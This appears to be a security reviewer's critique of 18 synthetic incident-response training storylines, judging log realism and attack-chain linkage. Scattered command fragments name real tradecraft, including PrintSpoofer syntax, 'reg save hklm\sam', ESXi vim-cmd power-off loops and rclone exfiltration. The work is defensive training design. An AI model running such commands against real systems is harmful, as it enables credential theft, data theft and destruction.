# Storyline review — batch 4

Reviewer stance: Tier-3 / IR lead. All 18 files were read event by event, including the authored fields, `raw`, `native.record` and `rawLine`. Scores are 1–5.

## Summary

| id | verdict | recognised | crypto | detect | e2e | logs | one-line reason |
|---|---|---|---|---|---|---|---|
| rogue-admin | FIX | 4 | no | 4 | 3 | 3 | A textbook "new account → Domain Admins" chain, but nothing explains how the Service Desk credential was misused from WS-ENG-2208, and the Sentinel alert hands the trainee the conclusion |
| esxi-ransomware | FIX | 5 | no | 3 | 4 | 3 | A strong Akira-style VPN → vCenter → ESXi chain. The scan, spray and rename evidence lives only in prose; vim-cmd on one host cannot stop 96 cluster VMs; the encryptor's transfer has no log |
| webshell-rce | FIX | 5 | no | 4 | 4 | 3 | Solid SQLi → web shell → PrintSpoofer chain. The native CrowdStrike cards carry inconsistent IPs, SIDs and PIDs; ib.dat has no origin; the exfil byte count is not in any record |
| linux-cryptominer | REMOVE | 4 | **yes** | 4 | 4 | 3 | XMRig / Monero is the incident. Keep the SSH brute-force → cron skeleton and give it a non-crypto payload |
| aitm-token-theft | FIX | 5 | no | 3 | 4 | 3 | An excellent AiTM design (the sign-in IP equals the phishing domain's A record; the SessionId is shared). There is no alert row, native IDs / UA / AADSessionId break pivots, and the native cards drop key evidence |
| infostealer-session-theft | FIX | 5 | no | 4 | 4 | 2 | A good stealer → cookie-replay chain. Native hash and path of the stealer contradict the download; the token type (PRT) is wrong; the replay gets a new SessionId; descriptions leak conclusions |
| helpdesk-mfa-reset | FIX | 5 | no | 3 | 3 | 3 | Scattered Spider pattern. The MFA registration has no preceding sign-in; a Tor IP shows no risk; the VDI session is not linked; the story ends before any impact |
| edge-vpn-cve-exploit | REPLACE | 5 | no | 3 | 2 | 2 | A FortiGate "WAF" logs its own admin API; the web-shell mechanism is invented; native cards drop URL and user; no VPN → jump-host link; Sentinel joins on an IP that is not in the data |
| exfil-first-extortion | FIX | 5 | no | 4 | 2 | 3 | rclone → MEGA data-theft extortion is very recognisable. There is no initial access and no tool drop; the extortion email exists only in prose; the SIEM rows state the lesson |
| nexacorp-chain-a | FIX | 3 | no | 3 | 2 | 2 | A credential phish with UrlCount 0 and no click. Key Vault secrets/list is logged in the wrong log with the wrong resource provider, and "list" is not "exfil" |
| nexacorp-chain-b | FIX | 5 | no | 3 | 2 | 3 | CEO BEC is very recognisable. No initial access; the token IssuedAtTime predates the sign-in; the 23 files and the recipient appear only in raw |
| nexacorp-chain-c | FIX | 4 | no | 3 | 3 | 2 | Insider theft. SharePoint ClientIP is RFC1918; the MDE native cards drop the user; bytes, DLP and recipient are missing from the native cards |
| nexacorp-chain-d | REPLACE | 3 | no | 4 | 1 | 2 | Internet → DC SMB spraying is not realistic, the story has no outcome, there are 3 thin legacy rows, and the lockouts contradict "spray" |
| rocketstack-chain-a | FIX | 4 | no | 3 | 2 | 2 | The Okta → AWS link is impossible (an Okta session does not yield IAM-user AKIA keys). Native Okta geo and behaviors contradict Tor / impossible travel. PutEventSelectors schema is wrong |
| rocketstack-chain-b | FIX | 5 | no | 4 | 3 | 3 | npm dependency confusion → reverse shell → AWS key abuse. The key-theft and CreateUser events are missing, and the reverse-shell command line is not on any native card |
| rocketstack-chain-c | REMOVE | 2 | **yes** | 3 | 2 | 2 | xmrig is in the title and is a central event. A user running a privileged container on his own laptop is not an attack path. CloudTrail shows a private source IP |
| rocketstack-chain-d | FIX | 4 | no | 4 | 2 | 2 | Okta credential stuffing → AWS. The same IP is geolocated to China and to Tel Aviv; an Okta login yields no IAM keys; "read from bucket" has no GetObject |
| medcore-chain-a | FIX | 4 | no | 4 | 2 | 3 | Phish → macro → ransomware. No WINWORD parent; the PowerShell payload domain differs from the DNS query; no lateral path to the EMR server; the docm hash equals the powershell.exe hash |

---

## rogue-admin — FIX
- **Recognised: 4.** T1136.002 plus T1098 (a new account added to Domain Admins) is among the highest-fidelity AD detections: MDI "Suspicious additions to sensitive groups" and the Sentinel "User added to privileged group" rules. Real anchors are insider-admin and stolen-IT-credential cases. The off-hours timing (22:47Z = 01:47 Asia/Jerusalem) is consistent.
- **Crypto:** no.
- **Detectable: 4.** evt_ra_06 (4728 on Domain Admins, SID -512) is the real first alert. evt_ra_10 is a correlated Sentinel alert.
- **End-to-end: 3.**
  - Path: evt_03 (RDP from WS-ENG-2208 / 10.10.44.61) → evt_05 (4720 s.katz) → evt_06 / 07 (Domain Admins and local Administrators) → evt_08 / 09 (s.katz logs on from the same IP).
  - Missing: the root cause. There are no logs from WS-ENG-2208 (EDR / 4624 / 4648) showing how t.aharoni's credential got there, or whether y.dagan's workstation is compromised versus an insider at the keyboard.
  - Missing: any action by s.katz after logon, so scope is undetermined.
  - Missing: a DC-side 4624 for the ADUC session. The DC events use SubjectLogonId 0x9C2F5B1, which has no matching logon anywhere.
- **Log reliability: 3.**
  - evt_ra_05: UserAccountControl `%%2082 %%2084` with no `%%2080`. Accounts created through ADUC / net user are created disabled, so expect 4720 `%%2080` followed by 4722 (enabled) and 4724 (password set). Neither 4722 nor 4724 is present.
  - evt_ra_04 / 09: 4672 is logged 1–2 minutes after its 4624. In reality it is the same second.
  - evt_ra_10: this is not a Sentinel SecurityAlert schema; it mixes `AlertName` with ECS `alert.rule.id`. Its ExtendedProperties ("Linked Onboarding Request: none", "Source Host Primary User: y.dagan", "Actor Assigned Device") do the whole investigation for the trainee. `src_ip` 10.10.20.77 is the DC, not a source.
  - All Windows rows have `native: null`. Windows Security has no native module anywhere on the platform (cross-cutting).
- **Fixes:**
  1. Add a WS-ENG-2208 EDR / 4648 row (for example, explicit credentials used by y.dagan's session, or a remote-access tool) that establishes how t.aharoni's credential reached the box.
  2. Add a DC 4624 type 3 for t.aharoni from SRV-ADM-07 with LogonId 0x9C2F5B1.
  3. Add 4722 / 4724 for s.katz, and set evt_05 UAC to `%%2080 %%2082 %%2084`.
  4. Add one post-escalation action by s.katz (for example, a share or NTDS access) so scope can be determined.
  5. Strip evt_10 to alert facts: the rule, the new account, the groups and the actor. Move the ticket and device context out of the alert, and let the trainee find it through the ServiceNow row (evt_01) and an asset lookup.

## esxi-ransomware — FIX
- **Recognised: 5.** Akira / Black Basta / ESXiArgs-style hypervisor ransomware: T1133 VPN without MFA (Akira via Cisco/Fortinet VPN), vCenter takeover, TSM-SSH enabled, `vim-cmd vmsvc/power.off` loop, encryption of `/vmfs/volumes`, `akira_readme.txt` note. The note does not mention Bitcoin.
- **Crypto:** no.
- **Detectable: 3.** What would really fire first is the vCenter brute force (evt_03), the esx.audit.ssh.enabled event on hosts if vCenter/ESXi syslog feeds the SIEM, or EDR mass-offline (evt_12). None is an alert row; evt_12 is the only alert-typed row and it arrives after impact.
- **End-to-end: 4.**
  - Path: evt_01 (tunnel IP 10.99.8.44) → evt_02 / 03 / 04 (same source to vCenter) → evt_05 (svc-monitor granted Administrator) → evt_06 / 07 / 08 (host changes) → evt_09 (root SSH from 10.99.8.44) → evt_10 / 13 / 14 (shell.log).
  - Missing: how `/tmp/.x/encryptor` arrived. There is no SCP/SFTP or sshd subsystem log and no download log.
  - Missing: any baseline showing that r.okonkwo normally connects from elsewhere, or that MFA is absent.
- **Log reliability: 3.**
  - evt_01 native AnyConnect `Group <GP-MDC-Users>` versus raw `VPN-Contractors`.
  - evt_02 native Check Point: `inzone/outzone Internal/Internal` for a VPN-sourced session, and `src_machine_name: FG-EDGE-01` (that is the gateway, not the client). The "118 addresses scanned / 9 answered" claim is prose only; a single accepted session is shown.
  - evt_03: `userName ""` while `fullFormattedMessage` says "Cannot login vcadmin@…". BadUsernameSessionEvent puts the name in userName. The "61 logins across 14 principals" claim is prose only.
  - evt_10: the description says all 96 VMs on PROD-CLUSTER-A were stopped, but `vim-cmd vmsvc/getallvms` on esx-prod-03 only sees VMs registered on that host. There are no shell.log rows from esx-prod-04 or 05.
  - evt_12: `AgentOffline` is not a Falcon event_simpleName; host offline is a console state, not telemetry. It renders `native: null` although a crowdstrike module exists.
  - evt_13: `file.sha256` is not in raw. shell.log carries no hash, so a hash pivot is impossible.
  - evt_14: the `.akira` rename is "found by responders", which is prose only.
- **Fixes:**
  1. evt_02: replace the single session with a firewall aggregate, or add 2–3 deny/accept rows to 22/902. Fix the native zones and src_machine_name.
  2. evt_03: set `userName` to the attempted principal. Add a second row for a failure against Administrator@vsphere.local before evt_04.
  3. evt_10: change the description to "VMs on esx-prod-03", or add shell.log rows on 04 and 05.
  4. Add an ESXi sshd/auth row for the SFTP/SCP upload of /tmp/.x/encryptor.
  5. Add the encryptor hash via a vCenter/EDR or file-integrity source, or drop the hash claim.
  6. evt_12: use a real Falcon sensor-offline/heartbeat representation or a monitoring tool, and render it through the crowdstrike native module.
  7. evt_14: add a `vmkernel` / `hostd` row showing a `*.vmdk.akira` file, or a `ls` in shell.log.
  8. Align the evt_01 native group name.

## webshell-rce — FIX
- **Recognised: 5.** T1190 SQL injection on an IIS/.NET shop, a WAF bypass via oversize body (an AWS WAF 8 KB inspection limit; a real technique), a UNION dump, secrets taken from an AppSettings table, an upload handler abused to drop an .aspx web shell (T1505.003), `w3wp → cmd`, PrintSpoofer (`-i -c cmd.exe` is its exact syntax; SeImpersonatePrivilege is primed by evt_01), and curl exfil.
- **Crypto:** no.
- **Detectable: 4.** The real first alert is the MDE/CS "web server process spawned shell / possible web shell" on evt_12 or evt_11. These are present as critical telemetry, though not as an alert row. The Qualys FP distractor (evt_03) is good.
- **End-to-end: 4.**
  - Path: evt_06 WAF (Content-Length 12438) → evt_07 IIS (csBytes 12438, 3.3 MB response) → evt_08 / 09 SQL audit (same timestamp, UNION) → evt_10 upload handler with the key → evt_11 file write → evt_12 cmd → evt_12a / b srv.exe → evt_13 SYSTEM → evt_14 egress.
  - Missing: the origin of `C:\Windows\Temp\ib.dat`. Its size, 3,312,486, is identical to the evt_07 HTTP response size, which looks like a copy-paste and makes no sense, because that data already left via the HTTP response.
  - Missing: a ProcessRollup for srv.exe itself (who ran it).
  - Missing: a DNS or proxy row for cdn-shopassets.link.
- **Log reliability: 3.**
  - Native CrowdStrike cards (MDE re-homed):
    - `LocalAddressIP4 10.18.247.139` on evt_11 / 12 / 12b / 13 versus `10.40.12.21` on evt_14 and in all raw.
    - evt_12 `UserSid S-1-5-21-…-4698` (a domain user) versus raw `S-1-5-82-…` (the IIS APPPOOL virtual account).
    - evt_12 and evt_13 both have `RawProcessId 7692` and the same `TargetProcessId 214116454642`, while raw says 7304 and 8016.
    - evt_12 `SessionId 1` for a w3wp child; it should be 0.
  - evt_14: MDE ConnectionSuccess and CS NetworkConnectIP4 carry no byte counts, so "3,312,486 bytes out" exists only in the description and the network block.
  - evt_12a: `csBytes 7842` equals `FileSize 7842` for a multipart upload; it should be larger.
  - evt_01: `logon.type: 5` is not part of 4672.
  - evt_12a description "using the same disclosed key" is mildly leading.
- **Fixes:**
  1. Make the native CS cards consistent: one LocalAddressIP4 (10.40.12.21), the S-1-5-82 SID, distinct RawProcessId / TargetProcessId values matching raw PIDs, and SessionId 0.
  2. Add a ProcessRollup2 for `srv.exe -i -c "cmd.exe"` with parent cmd.exe ← w3wp.exe.
  3. Add a file-write row for ib.dat (for example, `sqlcmd`/`bcp` or a cmd redirect dumping more DB data) with a size that is not the HTTP response size.
  4. Add a firewall/proxy row for 194.26.29.114 / cdn-shopassets.link that carries the bytes sent.
  5. Raise csBytes on evt_12a above 7842.

## linux-cryptominer — REMOVE (crypto)
- **Recognised: 4.** SSH brute force → cron persistence is a very common Linux incident (T1110.001, T1053.003; TeamTNT, Outlaw, Kinsing). The payload, however, is XMRig to pool.supportxmr.com with a Monero wallet (lsc_10, lsc_11, lsc_13; T1496).
- **Crypto: yes.** It is the incident itself, so the product owner's rule 2 applies.
- **Detectable: 4.** **End-to-end: 4.** **Logs: 3.** Quality notes, in case the skeleton is reused:
  - lsc_07 / lsc_10 render `native: null` although a crowdstrike module exists.
  - lsc_07 `SHA256HashData` is curl's hash; the downloaded file's hash appears only in the authored `file` block.
  - lsc_09: the crontab content is never shown, so the persistence line cannot be verified.
  - lsc_11 native FTD shows `URL https://pool.supportxmr.com` with reputation "Favorable" on tcp/3333 (Stratum is not HTTPS).
  - lsc_13: the "top shows kworker 690%" claim is prose only.
  - The FP controls (lsc_01 publickey admin, lsc_12 restic) are well designed.
- **Fixes:** Remove it. Recommended salvage: keep lsc_01–lsc_09 and swap the payload for a recognised non-crypto Linux implant, for example an XorDDoS / Mirai-style DDoS bot or a reverse-shell backdoor beaconing to C2. Add the crontab content as a PATH or file-content record, and keep the restic FP comparison.

## aitm-token-theft — FIX
- **Recognised: 5.** Storm-1167 / Evilginx / Tycoon 2FA AiTM (T1566.002, T1557, T1539 / T1550.004, T1098.005), matching Microsoft's 2022–2024 AiTM/BEC reporting closely.
- **Crypto:** no.
- **Detectable: 3.** In reality, Entra ID Protection would raise "Attacker in the Middle" / "Anomalous token", and Defender XDR would raise "Possible AiTM phishing attempt" or "Stolen session cookie was used". None of these is in the data: every sign-in has `riskLevelDuringSignIn none` and there is no alert row. aitm_12 (MFA method added from a new IP) would trigger a Sentinel analytic, but no alert is shown.
- **End-to-end: 4.** The pivots are excellent:
  - aitm_03 DNS A record 45.87.81.126 = aitm_04 / 05 proxy server IP = aitm_06 sign-in IP.
  - aitm_06 / 09 / 10 / 11 share `sessionId 0f2c1e64…` across Amsterdam and Frankfurt ASNs.
  - aitm_12 shares its correlationId with aitm_09 / 10.
  - aitm_08 is a good benign comparison.
  - Missing: the BEC follow-on (New-InboxRule / Set-InboxRule). Optional.
- **Log reliability: 3.**
  - User object ID differs between records: raw `b8f42a09…`, Entra native `1f25d76b…`, MDO RecipientObjectId and UAL TokenObjectId `8fa650e4…`.
  - aitm_07 native UA is Chrome/129 while raw is Edg/122.
  - aitm_10:
    - Raw appId `5d661950…` "OWA" versus native `9199bf20…` "One Outlook Web".
    - Native `userAgent Chrome/140` contradicts `deviceDetail.browser Chrome 121`.
    - Native location state is "Frankfurt".
  - aitm_11: `AppAccessContext.IssuedAtTime 07:06:03` is before the phishing sign-in at 07:18, which is impossible. `AADSessionId 6ce1429e…` does not equal the Entra sessionId, which breaks the strongest pivot.
  - aitm_08: native `networkLocationDetails: []` and a different CA policy (`907272f5`, "Require MFA - All users") versus raw (named "Corporate VPN — Frankfurt POP" network, `1f0b6c93`). The benign evidence is missing from the card trainees see.
  - aitm_12: native `modifiedProperties: []`, so the second Authenticator method is not visible.
  - aitm_09: `category SignInLogs` with `isInteractive false`. Non-interactive sign-ins live in AADNonInteractiveUserSignInLogs; pick one.
- **Fixes:**
  1. Use one user objectId across Entra, UAL and MDO.
  2. Set aitm_11 IssuedAtTime ≥ 07:24 and AADSessionId = `0f2c1e64…`.
  3. Carry raw networkLocationDetails and the CA policy into aitm_08 native, and modifiedProperties into aitm_12 native.
  4. Fix the aitm_07 / aitm_10 UA, appId and state contradictions.
  5. Add an Entra riskDetection (`attackerinTheMiddle` or `anomalousToken`) or a Defender XDR alert row at about 07:25 as the trigger.

## infostealer-session-theft — FIX
- **Recognised: 5.** Fake-software / SEO-poisoning download → Lumma/RedLine/Vidar-style stealer (T1204.002, T1555.003, T1539) → session-cookie replay (T1550.004) → SharePoint access, which is the dominant 2024–2026 ATO pattern.
- **Crypto:** no.
- **Detectable: 4.** The CS/MDE credential-theft detection (evt_ist_09) is present. The PAN file alert (evt_02) is low severity. The Entra replay row has no risk.
- **End-to-end: 4.**
  - Path: evt_02 → 03 → 04 (by hash 2f1c73f3) → 05 / 06 (by process) → 07 (egress) → 08 (replay) → 10 (SharePoint, same sessionId and correlationId).
  - Missing: the `Local State` write (cited in the evt_05 description but not present).
  - Missing: other stolen saved credentials. Login Data was taken, so scope should include other services.
- **Log reliability: 2.**
  - evt_05 / 06 native: `InitiatingProcessFolderPath C:\Windows\System32\PDF_Converter_Pro_Setup.exe` and `InitiatingProcessSHA256 74a25c77…`. Both contradict evt_04 (Downloads folder, SHA256 2f1c73f3…), so the hash and path pivots break. The authored `process.path` has the same error.
  - evt_03: chrome.exe path `C:\Windows\System32\chrome.exe`; it should be `C:\Program Files\Google\Chrome\Application\chrome.exe`.
  - evt_07: raw `action allow` versus native `action alert`. PAN THREAT/url has no byte counts, so "178 KB" is not on the native card.
  - evt_08:
    - `incomingTokenType primaryRefreshToken` is wrong for a replayed browser cookie on an unmanaged device; it should be `none`.
    - `sessionId e9c2a705…` differs from the victim's session `72d4f8a1…`. Cookie replay inherits the session ID, and that sameness is the proof.
    - Category SignInLogs with isInteractive false.
  - Entra native userId `fb61ef3e…` versus raw `9c4a2f18…` versus MDE AccountObjectId `40048fec…`.
  - Descriptions leak conclusions:
    - evt_08: "five minutes after Falcon saw her Cookies database copied".
    - evt_09: "after the archive had already left the host and the stolen session had already been used".
    - evt_05: an interpretive paragraph about the locked SQLite database.
  - evt_09: `DetectName BrowserCredentialStoreStagingAndTransfer` is not a Falcon detect name. The native MDE AlertEvidence carries no file or process entity.
- **Fixes:**
  1. Fix the evt_05 / 06 native initiating path and hash to the Downloads path and 2f1c73f3.
  2. Fix the evt_03 chrome path.
  3. evt_08: set incomingTokenType `none` and sessionId `72d4f8a1…`.
  4. Add a PAN TRAFFIC end row with bytes_sent 182304 for the session in evt_07, or make the native card a TRAFFIC log, and align the action field.
  5. Add the Local State FileCreated row.
  6. Neutralise the evt_05, evt_08 and evt_09 descriptions.
  7. Unify the user objectId.

## helpdesk-mfa-reset — FIX
- **Recognised: 5.** Scattered Spider / Octo Tempest helpdesk social engineering (T1656 → MFA reset → T1098.005 → T1078.004), as in the MGM/Caesars 2023 cases and CISA AA23-320A.
- **Crypto:** no.
- **Detectable: 3.**
  - Logins from 185.220.101.47 (a Tor-exit range) would get Entra `anonymizedIPAddress` / `unfamiliarFeatures` risk, but every row says risk none.
  - There is no alert row (for example, a Sentinel "MFA reset followed by registration from new IP").
  - The clever clue (evt_hmr_03: the real user signs in with her Authenticator at 09:45 while "she lost her phone" at 09:41) is good, but a T1 needs a trigger to look.
- **End-to-end: 3.**
  - Path: evt_02 ticket → evt_05 reset → evt_06 registration from 185.220.101.47 → evt_07 sign-in → evt_08 VDI.
  - Missing: the sign-in that must precede evt_06. Registration requires an authenticated session (a password-only sign-in hitting the "registration required" interrupt). As written, the method is registered at 09:58 from an IP that has never signed in, and the sign-in follows at 10:01.
  - Missing: an admin "Reset password" audit event (the ticket says the password was reset).
  - Missing: any link from the Exchange Online sign-in to VDI-POOL-014 (a VDI/AVD/Citrix gateway sign-in from 185.220.101.47).
  - Missing: any activity on the VDI or in the mailbox, so impact and scope are unknown.
- **Log reliability: 3.**
  - Entra native userId `2d18031d…` versus raw `e63a9c07…`; j.oduya `604bd4b8…` versus `a2c8f314…`.
  - evt_06 native `modifiedProperties: []` drops the evidence.
  - evt_04 native `work_notes ""` drops "no video verification performed".
  - evt_05 is logged after the ticket was resolved; actions normally precede resolution.
  - Descriptions do the analysis:
    - evt_03: "the ticket taken on her behalf".
    - evt_06: "not the address recorded on either of her sign-ins this morning".
  - evt_08 is a benign explorer.exe start marked high with nothing following.
  - 185.220.101.47 is reused in edge-vpn, infostealer, dcsync and k8s-pod-escape (cross-story IOC collision).
- **Fixes:**
  1. Add a sign-in at about 09:56 from 185.220.101.47 (password only; `authenticationRequirement singleFactorAuthentication`; app My Signins / "Microsoft App Access Panel") before evt_06.
  2. Add an Entra "Reset password (by admin)" audit row.
  3. Add riskEventTypes_v2 `anonymizedIPAddress` (medium) on evt_07, or a Sentinel alert row.
  4. Add an AVD/Citrix gateway sign-in from 185.220.101.47 for VDI-POOL-014, plus 1–2 attacker actions there (share browse or mailbox export).
  5. Carry work_notes and modifiedProperties into the native cards.
  6. Neutralise the evt_03 and evt_06 descriptions.
  7. Use a unique IP for this story.

## edge-vpn-cve-exploit — REPLACE
- **Recognised: 5** as a concept. FortiOS CVE-2022-40684 (`/api/v2/cmdb/system/admin` auth bypass), CVE-2024-21762 and Ivanti CVE-2024-21887 are canonical: T1190 → config / credential theft → VPN login → internal recon via Impacket wmiexec (`cmd.exe /Q /c`) → `reg save hklm\sam` → admin share.
- **Crypto:** no.
- **Detectable: 3.**
  - The real first alerts are an IPS signature for the CVE, the FortiOS event log showing `user="Local_Process_Access"` (the published IoC), and EDR credential-dumping detection on evt_06.
  - The only alert row (evt_08) fires at 03:10, after everything.
  - CrowdStrike "detection.*" fields are bolted onto ProcessRollup2 telemetry.
- **End-to-end: 2.**
  - Missing: the link from the VPN session (tunnel 10.60.200.14) to SRV-JUMP-03. There is no 4624 type 3 from 10.60.200.14, no RPC/135 flow, and nothing that puts the tunnel IP on the jump host.
  - evt_08 claims Sentinel joined 185.220.101.47 across the process tree, but that IP never appears on SRV-JUMP-03. Its `host.ip 185.220.101.47` is wrong, and `Linked Event IDs` exposes internal story IDs.
  - Lateral movement stops at `net use` (evt_07). There is no logon on SRV-FILE-02.
  - The web shell (evt_02) is never used.
- **Log reliability: 2.**
  - evt_01–03: a FortiGate WAF profile does not inspect, or log as `utm/waf`, requests to the FortiGate's own admin API / SSL-VPN portal.
  - "PUT to /api/v2/cmdb/system/admin/ writes healthcheck.cgi into the portal theme directory" is an invented mechanism; 40684 was used to add admin SSH keys or users.
  - The native PAN TRAFFIC cards on evt_01 and evt_03 carry no URL, method or user, so the key "data.user blank" evidence is invisible.
  - evt_04: raw `tunneltype ssl-web` (web mode cannot run WMI to internal hosts) versus native GlobalProtect tunnel. The native record shows a corporate `machinename NXC-LT-4591`, hostid and serial, which contradicts an attacker device.
  - evt_04 description states an unevidenced conclusion: "the same password the admin also reuses for their NEXACORP domain account…".
  - evt_05 native: `InitiatingProcess WmiPrvSE` running as j.alvarez (it runs as NETWORK SERVICE / SYSTEM) and SessionId 1 (WMI children run in session 0).
  - evt_06 native: InitiatingProcessSHA256 `3f201ddc…` ≠ cmd.exe SHA256 `dd2f5033…` in evt_05.
  - evt_07 native: InitiatingProcessIntegrityLevel Medium under a High cmd.exe.
  - `companies: null`.
- **Rewrite guidance:**
  1. Keep the internal half (evt_05–07).
  2. Replace evt_01–03 with FortiOS event-log rows: an admin login with `user=Local_Process_Access` / `ui=Node.js` from 185.220.101.47, a config change adding an admin user or SSH key, and a config backup download, plus an IPS-signature threat row. Drop the .cgi web shell or make it a real post-exploit implant observed later.
  3. Add SRV-JUMP-03 4624 type 3 (NTLM) from 10.60.200.14 and an RPC / DCOM flow.
  4. Add a logon on SRV-FILE-02.
  5. Make the SIEM alert key on j.alvarez + 10.60.200.14, and drop the event-ID list.
  6. Neutralise the evt_04 description and fix the native process fields.
  7. Assign companies and a unique attacker IP.

## exfil-first-extortion — FIX
- **Recognised: 5.** Data-theft-only extortion (Karakurt, BianLian's 2023 shift, Cl0p, Lapsus$): staging with robocopy (T1074.001), 7z with password and `-mhe` (T1560.001), renamed rclone to MEGA (T1567.002). This is a DFIR Report staple.
- **Crypto:** no.
- **Detectable: 4.** The Purview Endpoint DLP alert (evt_03) is a realistic first signal. MDE would also flag renamed rclone.
- **End-to-end: 2.**
  - Path: evt_01 → 02 → 04 (same cmd.exe parent, InitiatingProcessUniqueId 30002563151611) → 05 / 06 (same host, user and session) → 07 / 08.
  - Missing: who is at the keyboard at 01:05. There is no logon (RDP/VPN/C2), cmd.exe has a null parent, and there is no file-create for 7z.exe, AdobeARMHelper.exe or rclone.conf. Insider versus external cannot be decided, so containment (disable the user versus isolate the host) cannot be chosen from evidence.
  - Missing: file-server access logs (SRV-NX-FIN01 5140/5145) for scope.
- **Log reliability: 3.**
  - evt_06 native `sport 63225` versus evt_05 `sport 53301` for the same sessionid 981204; start time 01:29:00 versus 01:29:15.
  - A single TLS session carrying 39.6 GB with `--transfers=8` (rclone opens many sessions to several MEGA nodes); acceptable as a simplification.
  - evt_04 native lacks `ProcessVersionInfoOriginalFileName` (rclone.exe), which is the key masquerade evidence.
  - evt_03 mixes real O365 DLP fields with invented `purview.*` keys.
  - evt_07 ExtendedProperties ("Encryption Events In Correlation Window: 0", "Ransom Note Artifacts Detected: 0") and the evt_07 / 08 descriptions state the lesson.
  - The extortion email (evt_08) exists only as a comment.
  - evt_02 description: "not a path any NexaCorp software-distribution record installed" cites evidence that does not exist.
- **Fixes:**
  1. Add the initial-access / session rows: either an RDP 4624 type 10 from an external VPN IP for r.doyle at about 00:55, or an MDE remote-tool process.
  2. Add FileCreated rows for 7z.exe, AdobeARMHelper.exe and rclone.conf.
  3. Add `ProcessVersionInfoOriginalFileName: rclone.exe` on evt_04.
  4. Add the extortion email as an MDO EmailEvents row to security@.
  5. Make the evt_05 / 06 ports consistent.
  6. Strip the negative-evidence properties and conclusions from evt_07 / 08.

## nexacorp-chain-a — FIX
- **Recognised: 3.** Credential phish → mailbox rule (T1114.003) is BEC-standard. Bolting on a prod Key Vault read by a mail-phished user is less typical and needs a stated reason (for example, an engineer).
- **Crypto:** no.
- **Detectable: 3.** The real alert is MDO/MDCA "Suspicious inbox forwarding rule" (nx_a3) or an Entra "Anonymous IP" risk (185.220.100.209 is a Tor range). Neither is an alert row; nx_a2 risk is none.
- **End-to-end: 2.** The phish and the sign-in are linked only by time. nx_a1 has `UrlCount 0` and there is no click, proxy or landing-page row. Nothing shows what was read from Key Vault.
- **Log reliability: 2.**
  - nx_a1 raw `Operation MessageDelivered` is not a UAL operation (that is message trace / EmailEvents).
  - nx_a1 native credential phish with `UrlCount: 0` and `SenderIPv4` blank.
  - nx_a4: `secrets/list` is a data-plane call logged in Key Vault diagnostic logs (`AuditEvent`, operationName `SecretList` / `SecretGet`), not in the Azure Activity Log "Administrative" category.
  - nx_a4 resourceId uses `MICROSOFT.RESOURCES/KV-…` instead of `MICROSOFT.KEYVAULT/VAULTS/…`.
  - nx_a4: "listed 12 secrets" is prose only. List returns names, not values, so "exfil" in the title is unsupported.
- **Fixes:**
  1. nx_a1: UrlCount 1 with the URL, plus a UrlClickEvents or proxy row.
  2. nx_a2: add an Entra risk (anonymizedIPAddress).
  3. Re-emit nx_a4 as Key Vault AuditEvent `SecretList` followed by several `SecretGet` with the correct resource ID and caller IP.
  4. Add one row explaining c.thornton's Key Vault access (role assignment or group).

## nexacorp-chain-b — FIX
- **Recognised: 5.** CEO account takeover / BEC wire fraud (FBI IC3's top-loss category), with a hidden rule to RSS Subscriptions plus mark-as-read.
- **Crypto:** no.
- **Detectable: 3.** The sign-in from a Tor range with single factor (nx_b1) would get Entra risk; it shows none. The hidden-rule alert is not an alert row.
- **End-to-end: 2.**
  - Missing: initial access (how the CEO password was obtained).
  - Missing: the finance reply or payment outcome (impact).
  - The 23 files and Finance + Legal appear only in raw/description; native is one folder record for Finance.
- **Log reliability: 3.**
  - nx_b2 raw `SendMail` is not UAL; native `Send` is correct but carries no recipient, so "to finance@" is prose only.
  - nx_b2 `AppAccessContext.IssuedAtTime 09:43:35` is before the 10:00 sign-in, and `AADSessionId abe6ccd3…` does not equal the Entra sessionId `b0111478…`.
  - nx_b3 `GeoLocation NAM`.
  - The rule is created after the fraud email (10:22 versus 10:08). Attackers normally hide replies first; reorder or justify.
- **Fixes:**
  1. Add the initial vector (a phish or password spray against ceo@).
  2. Add an MDO EmailEvents intra-org row (ceo → finance) to show the recipient.
  3. Fix IssuedAtTime and AADSessionId.
  4. Emit multiple FileAccessed rows (or a FileAccessed burst) across Finance and Legal.
  5. Move nx_b4 before nx_b2.
  6. Add an Entra risk on nx_b1.

## nexacorp-chain-c — FIX
- **Recognised: 4.** Departing-insider IP theft via SharePoint → USB → file-transfer site → personal email (Purview IRM "data theft by departing users"; T1052.001, T1567.002 rather than T1048, and T1048.003).
- **Crypto:** no.
- **Detectable: 3.** The DLP match is audit-only and appears only in raw. MDE has no real "Outbound data transfer…" alert (it is pasted into raw telemetry).
- **End-to-end: 3.** User → host → files are linkable. Missing: the HR or trigger context, the USB device-mount event, and bytes for the transfernow upload in any native record.
- **Log reliability: 2.**
  - nx_c1 SPO `ClientIP 10.20.1.55` is private; SPO sees the public egress IP. "18 files" is a single folder record.
  - nx_c2 / c3 native `InitiatingProcessAccountName: null` (and the other account fields), so the user pivot is lost on the cards trainees see.
  - nx_c2 native drops `AdditionalFields` (drive letter / serial) and FileSize.
  - nx_c3: MDE ConnectionSuccess has no bytes, so "22 MB" is prose only. raw `mde.AlertTitle` is not part of DeviceNetworkEvents.
  - nx_c4 native `Send` has no recipient, attachment or DLP, so all the evidence is in raw only.
- **Fixes:**
  1. Use the public egress IP on nx_c1, plus FileDownloaded per file (or a burst).
  2. Populate the account fields in MDE native.
  3. Add an MDE `UsbDriveMounted` / PnP row with the serial.
  4. Add a proxy/firewall row with bytes for transfernow.
  5. Replace nx_c4 native with MDO EmailEvents (outbound, recipient, AttachmentCount) plus a Purview `DlpRuleMatch` row.
  6. Correct the MITRE ID to T1567.002.

## nexacorp-chain-d — REPLACE
- **Recognised: 3.** Password spraying (T1110.003) is recognised, but spraying a domain controller over SMB directly from a Tor exit implies DC port 445 exposed to the internet, which is not a realistic estate. Real sprays hit Entra / ADFS / OWA / VPN, or come from an internal foothold.
- **Crypto:** no.
- **Detectable: 4.** The 4625 burst, 4740 and the PAN threat row are present.
- **End-to-end: 1.** No success, no account outcome, no scope. The investigation ends at "block the IP".
- **Log reliability: 2.**
  - The 4625 rows are skeletal (no Status, IpAddress, WorkstationName, LogonProcessName, AuthenticationPackageName).
  - nx_d3 4740 `CallerComputerName \\185.220.101.45`; it carries the workstation name, not an IP.
  - Lockout of jchen plus "6 more lockouts" contradicts spraying, which stays under the lockout threshold.
  - PAN blocks at 17:07 on rule `OUTSIDE-IN-BLOCK` after the DC already received 4625s from that IP; the order contradicts itself.
  - Threat ID 40001 needs verification as an SMB brute-force signature.
  - Descriptions such as "spray now hitting a second account" interpret rather than state facts.
